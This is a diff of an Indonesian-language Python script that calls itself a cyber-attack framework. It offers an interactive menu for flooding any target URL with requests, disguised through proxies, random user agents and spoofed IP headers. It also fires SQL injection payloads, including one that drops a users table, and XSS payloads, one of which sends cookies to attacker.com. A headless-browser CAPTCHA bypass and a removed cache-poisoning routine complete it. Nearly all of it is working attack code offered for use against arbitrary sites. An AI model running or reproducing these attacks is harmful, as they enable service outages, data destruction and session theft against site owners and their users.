@@ -1,239 +1,159 @@
 import requests
-import time
-import threading
-import logging
 import random
 import string
+import logging
+import asyncio
+import time
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import asyncio
 
-R = '\033[91m'  # Red
-G = '\033[92m'  # Green
-Y = '\033[93m'  # Yellow
-B = '\033[94m'  # Blue
-M = '\033[95m'  # Magenta
-C = '\033[96m'  # Cyan
-N = '\033[0m'   # Reset
+logging.basicConfig(filename='log_serangan.txt', level=logging.INFO, format='%(asctime)s - %(message)s')
 
-print(f"""{G}
--------------------------{R}######{G}-------------------------
----------------------{R}######{G}--{R}######{G}---------------------
-------------------{R}###{G}--------------{R}###{G}------------------
----------------{R}####{G}------------------{R}####{G}---------------
---------------{R}#{G}-{R}#{G}--------------------{R}#{G}-{R}#{G}-{R}#{G}--------------
---------------{R}##{G}------------------------{R}##{G}--------------
--------------{R}#{G}----------------------------{R}#{G}-------------
-------------{R}#{G}-------------{R}####{G}-------------{R}#{G}------------
--------------------------{R}######{G}-------------------------
------------{R}#{G}--------{R}##{G}----{R}####{G}----{R}##{G}--------{R}#{G}-----------
-----------{R}#{G}-------{R}######{G}---{R}##{G}---{R}######{G}-------{R}#{G}----------
----------{R}#{G}-----------------{R}##{G}----------------{R}##{G}---------
---------{R}#{G}--------{R}######################{G}-------{R}##{G}--------
------------------{R}######################{G}-----------------
--------{R}#{G}--------------{R}##{G}---{R}##{G}---{R}##{G}--------------{R}#{G}-------
-------------------{R}#{G}---{R}###{G}------{R}###{G}---{R}#{G}------------------
---------{R}#{G}----------{R}#{G}-------{R}##{G}-------{R}#{G}----------{R}#{G}--------
----------{R}#{G}----------{R}##{G}-{R}####{G}--{R}#######{G}----------{R}#{G}---------
-------------{R}#{G}---------{R}#####{G}--{R}#####{G}---------{R}#{G}------------
-----------{R}#{G}-------------{R}###{G}--{R}###{G}-------------{R}#{G}----------
------------{R}##{G}------------------------------{R}##{G}-----------
--------{R}#####{G}--------------------------------{R}#####{G}-------
-----{R}###{G}-{R}#{G}--------------------------------------{R}#{G}-{R}###{G}----
---------------------------------------------------------
---------------------------------------------------------
-----------------------{R}#{G}----------{R}#{G}----------------------
-----------------------{R}#{G}----------{R}#{G}----------------------
----------------------------------{R}#{G}----------------------""")
-print("Printing banner...")
-print(f"{R}                                                                                   {N}")
-print(f"{R} ,-----.         ,--.                 ,--.                                         {N}")
-print(f"{Y}'  .--./,--. ,--.|  |-.  ,---. ,--.--.|  ,---.  ,---. ,--.--. ,---.  ,---.  ,---.  {N}")
-print(f"{G}|  |     \\  '  /| .-. '| .-. :|  .--'|  .-.  || .-. :|  .--' | .-. || .-. (  .-'  {N}")
-print(f"{C}'  '--'\\  \\   '| `-'  \\  --.|  |   |  | |  |\\  --.|  |    ' '-' \\ `---..-'  `) {N}")
-print(f"{M} `-----'.-'  /    `---'  `----'`--'   `--' `--' `----'`--'    `---'  `----'`----'  {N}")
-print(f"{Y}        `---'                                                                       {N}")
-print("Banner printed.")  
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/92.0',
+    'Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+]
 
+PROXIES = [
+    {"http": "http://proxy1.example.com:8080", "https": "http://proxy1.example.com:8080"},
+    {"http": "http://proxy2.example.com:8080", "https": "http://proxy2.example.com:8080"},
+    # Tambahkan proxy aktif lainnya
+]
 
-# jangan lupa kasih bintang🗿
+def bot_response(pesan):
+    print(f"[BOT]: {pesan}")
+    logging.info(pesan)
 
-logging.basicConfig(filename='exploit_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')
+def get_random_proxy():
+    return random.choice(PROXIES) if PROXIES else None
 
-def bot_response(message):
-    print(f"Bot: {message}")
-    logging.info(message)
+def get_random_user_agent():
+    return random.choice(USER_AGENTS)
 
-async def send_doS_request(url):
+async def kirim_request_dos(url):
     headers = {
-        'User-Agent': random.choice([
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/92.0',
-            'Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36'
-        ]),
+        'User-Agent': get_random_user_agent(),
+        'Referer': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
+        'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
     }
-    
+    proxy = get_random_proxy()
     try:
-        response = await asyncio.to_thread(requests.get, url, headers=headers)
-        if response.status_code != 200:
-            logging.error(f"Error: {response.status_code}")
-        logging.info(f"Request sent to {url} | Status: {response.status_code}")
+        response = await asyncio.to_thread(requests.get, url, headers=headers, proxies=proxy, timeout=5)
+        logging.info(f"Request berhasil dikirim ke {url} | Status: {response.status_code}")
     except requests.exceptions.RequestException as e:
-        logging.error(f"Request failed: {e}")
+        logging.error(f"Request gagal: {e}")
 
-async def amp_dos_attack():
-    bot_response("Memulai serangan Denial of Service (DoS) pada AMP...")
-    url = input("Masukkan URL target untuk DoS attack: ")
-    thread_count = int(input("Masukkan jumlah thread untuk DoS attack (misalnya 10): "))
+async def serangan_dos():
+    bot_response("Memulai serangan Denial of Service (DoS)...")
+    url = input("Masukkan URL target: ")
+    jumlah_request = int(input("Masukkan jumlah permintaan (misalnya 100): "))
     
     tasks = []
-    for _ in range(thread_count):
-        tasks.append(send_doS_request(url))
-    
+    for _ in range(jumlah_request):
+        tasks.append(kirim_request_dos(url))
     await asyncio.gather(*tasks)
-    bot_response("Serangan DoS pada AMP selesai.")
-
-def cache_poisoning(url):
-    headers = {
-        'Cache-Control': 'public, max-age=3600',
-        'X-Forwarded-Host': 'malicious-site.com'
-    }
-    try:
-        response = requests.get(url, headers=headers)
-        if response.status_code == 200:
-            logging.info("Cache poisoning berhasil. Respons server:")
-            logging.info(response.text)
-        else:
-            logging.warning(f"Gagal memanipulasi cache. Status: {response.status_code}")
-    except requests.exceptions.RequestException as e:
-        logging.error(f"Request failed: {e}")
-
-def amp_cache_poisoning():
-    bot_response("Memulai serangan Cache Poisoning pada AMP...")
-    url = input("Masukkan URL target untuk cache poisoning: ")
-    cache_poisoning(url)
-    bot_response("Serangan Cache Poisoning pada AMP selesai.")
+    bot_response("Serangan DoS selesai.")
 
 def sql_injection(url):
     payloads = [
         "' OR 1=1 --",
         "' UNION SELECT null, username, password FROM users --",
-        "' OR 'x'='x",
+        "' AND SLEEP(5) --",
+        "' OR 1=1 LIMIT 1 --",
+        "' AND 1=1 UNION SELECT username, password FROM users --",
+        "'; DROP TABLE users --"
     ]
-    
     for payload in payloads:
+        headers = {'User-Agent': get_random_user_agent()}
+        proxy = get_random_proxy()
         try:
-            response = requests.get(url + payload)
-            if "error" in response.text or "sql" in response.text.lower():
-                logging.info(f"SQL Injection potential found with payload: {payload}")
+            response = requests.get(url + payload, headers=headers, proxies=proxy, timeout=5)
+            if "error" in response.text.lower() or "sql" in response.text.lower():
+                logging.info(f"Potensi celah SQL Injection ditemukan dengan payload: {payload}")
             else:
-                logging.info(f"SQL Injection failed with payload: {payload}")
+                logging.info(f"Tidak ada celah dengan payload: {payload}")
         except requests.exceptions.RequestException as e:
-            logging.error(f"Request failed: {e}")
+            logging.error(f"SQL Injection gagal: {e}")
 
-def amp_sql_injection():
-    bot_response("Memulai serangan SQL Injection pada API AMP...")
-    url = input("Masukkan URL endpoint API untuk SQL Injection: ")
+def serangan_sql_injection():
+    bot_response("Memulai serangan SQL Injection...")
+    url = input("Masukkan URL target: ")
     sql_injection(url)
-    bot_response("Serangan SQL Injection pada AMP selesai.")
+    bot_response("Serangan SQL Injection selesai.")
 
 def xss_attack(url):
     payloads = [
         "<script>alert('XSS');</script>",
         "<img src='x' onerror='alert(1)'>",
-        "<svg/onload=alert(1)>"
+        "<svg/onload=alert(1)>",
+        "<body onload=alert('XSS')>",
+        "<script>document.location='http://attacker.com?cookie='+document.cookie</script>"
     ]
-    
     for payload in payloads:
+        headers = {'User-Agent': get_random_user_agent()}
+        proxy = get_random_proxy()
         try:
-            response = requests.get(url + payload)
+            response = requests.get(url + payload, headers=headers, proxies=proxy, timeout=5)
             if payload in response.text:
-                logging.info(f"XSS berhasil disuntikkan dengan payload: {payload}")
+                logging.info(f"Payload XSS berhasil disuntikkan: {payload}")
             else:
-                logging.info(f"XSS tidak berhasil dengan payload: {payload}")
+                logging.info(f"Payload XSS gagal: {payload}")
         except requests.exceptions.RequestException as e:
-            logging.error(f"Request failed: {e}")
+            logging.error(f"Serangan XSS gagal: {e}")
 
-def amp_xss_attack():
-    bot_response("Memulai serangan XSS pada AMP...")
-    url = input("Masukkan URL untuk pengujian XSS: ")
+def serangan_xss():
+    bot_response("Memulai serangan XSS...")
+    url = input("Masukkan URL target: ")
     xss_attack(url)
-    bot_response("Serangan XSS pada AMP selesai.")
-
-def test_api_security(url):
-    params = {
-        'username': "' OR '1'='1",
-        'password': "' OR '1'='1",
-    }
-    
-    try:
-        response = requests.get(url, params=params)
-        if response.status_code == 200:
-            logging.info("API tersedia dan merespons.")
-        else:
-            logging.warning(f"Error: {response.status_code}")
-    except requests.exceptions.RequestException as e:
-        logging.error(f"Request failed: {e}")
-
-def amp_api_security_test():
-    bot_response("Memulai pengujian keamanan API AMP...")
-    url = input("Masukkan URL API AMP untuk pengujian: ")
-    test_api_security(url)
-    bot_response("Pengujian keamanan API AMP selesai.")
+    bot_response("Serangan XSS selesai.")
 
 def bypass_captcha(url):
     try:
-        chrome_options = Options()
-        chrome_options.add_argument("--headless")
-        driver = webdriver.Chrome(options=chrome_options)
+        options = Options()
+        options.add_argument("--headless")
+        driver = webdriver.Chrome(options=options)
         driver.get(url)
-        sleep(5)
-        
-        driver.find_element(By.ID, 'submit').click()
-        logging.info("Captcha terlewati, permintaan dikirim.")
+        time.sleep(3)  # Menunggu elemen CAPTCHA
+        driver.find_element(By.ID, "submit").click()
+        logging.info("Bypass CAPTCHA berhasil.")
         driver.quit()
     except Exception as e:
-        logging.error(f"Captcha bypass failed: {e}")
+        logging.error(f"Bypass CAPTCHA gagal: {e}")
 
-def bypass_protection():
-    bot_response("Memulai bypass CAPTCHA dan proteksi bot...")
-    url = input("Masukkan URL untuk bypass CAPTCHA: ")
+def serangan_bypass_captcha():
+    bot_response("Memulai bypass CAPTCHA...")
+    url = input("Masukkan URL target: ")
     bypass_captcha(url)
     bot_response("Bypass CAPTCHA selesai.")
 
 def main():
-    bot_response("Selamat datang! Saya adalah bot eksploitasi yang akan membantu Anda memahami serangan terhadap situs web AMP.")
+    bot_response("Selamat datang di framework serangan siber!")
     while True:
-        bot_response("\n🔥Pilih serangan untuk diuji 🔥:")
-        bot_response("1. Denial of Service (DoS) pada AMP")
-        bot_response("2. Cache Poisoning pada AMP")
-        bot_response("3. SQL Injection pada API AMP")
-        bot_response("4. XSS pada AMP")
-        bot_response("5. Pengujian Keamanan API AMP")
-        bot_response("6. Bypass CAPTCHA dan Proteksi Bot")
-        bot_response("7. Keluar")
-        
-        choice = input("Masukkan pilihan Anda (1-7): ")
-        
-        if choice == '1':
-            asyncio.run(amp_dos_attack())
-        elif choice == '2':
-            amp_cache_poisoning()
-        elif choice == '3':
-            amp_sql_injection()
-        elif choice == '4':
-            amp_xss_attack()
-        elif choice == '5':
-            amp_api_security_test()
-        elif choice == '6':
-            bypass_protection()
-        elif choice == '7':
-            bot_response("Terima kasih telah menggunakan bot eksploitasi. Sampai jumpa!")
+        bot_response("\nPilih serangan yang ingin diuji:")
+        bot_response("1. Denial of Service (DoS)")
+        bot_response("2. SQL Injection")
+        bot_response("3. Cross-Site Scripting (XSS)")
+        bot_response("4. Bypass CAPTCHA")
+        bot_response("5. Keluar")
+
+        pilihan = input("Masukkan pilihan Anda (1-5): ")
+        if pilihan == '1':
+            asyncio.run(serangan_dos())
+        elif pilihan == '2':
+            serangan_sql_injection()
+        elif pilihan == '3':
+            serangan_xss()
+        elif pilihan == '4':
+            serangan_bypass_captcha()
+        elif pilihan == '5':
+            bot_response("Terima kasih telah menggunakan framework ini. Sampai jumpa!")
             break
         else:
-            bot_response("Pilihan tidak valid. Silakan pilih antara 1 dan 7.")
+            bot_response("Pilihan tidak valid. Silakan pilih kembali.")
 
 if __name__ == "__main__":
     main()
